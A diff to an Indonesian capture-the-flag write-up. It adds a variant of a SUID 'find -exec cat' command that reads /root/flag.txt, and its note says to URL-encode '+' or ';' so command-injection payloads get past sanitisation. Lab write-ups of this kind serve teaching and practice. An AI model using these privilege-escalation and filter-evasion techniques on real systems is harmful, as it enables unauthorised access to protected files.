@@ -141,6 +141,10 @@ Baca isi berkas flag menggunakan opsi `-exec cat` pada binary SUID find:
 /usr/bin/find /root/flag.txt -exec cat {} \;
 ```
 
+```bash
+/usr/bin/find /root/flag.txt -exec cat {} +
+```
+
 > **Catatan:** Pada payload berbasis web (Command Injection / RCE), simbol `+` atau `\;` pada akhir perintah sering disanitasi oleh aplikasi. Lakukan **URL encode** pada simbol tersebut agar tidak tersanitasi, contoh `+` menjadi `%2B`:
 
 ```http
